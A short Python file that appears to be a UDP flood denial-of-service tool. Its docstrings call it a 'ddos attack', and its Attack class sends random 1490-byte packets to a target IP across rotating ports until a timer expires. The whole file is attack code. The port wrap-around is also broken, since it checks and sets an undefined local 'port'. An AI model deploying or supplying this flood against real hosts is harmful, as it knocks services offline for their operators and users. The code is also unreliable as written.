"""File for doss attack"""

from datetime import datetime, timedelta
from random import _urandom
from socket import AF_INET, SOCK_DGRAM, socket


class Attack:
    """Class for ddos attack"""
    sock = socket(AF_INET, SOCK_DGRAM)
    bytes = _urandom(1490)

    def __init__(self, ip, port, end_time):
        self.ip = ip
        self.port = port
        self.end_time = datetime.now() + timedelta(seconds=end_time)

    def attack(self):
        sent = 0
        while datetime.now() <= self.end_time:
            self.sock.sendto(self.bytes, (self.ip,self.port))
            sent += 1
            self.port = self.port + 1
            if port == 65534:
                port = 1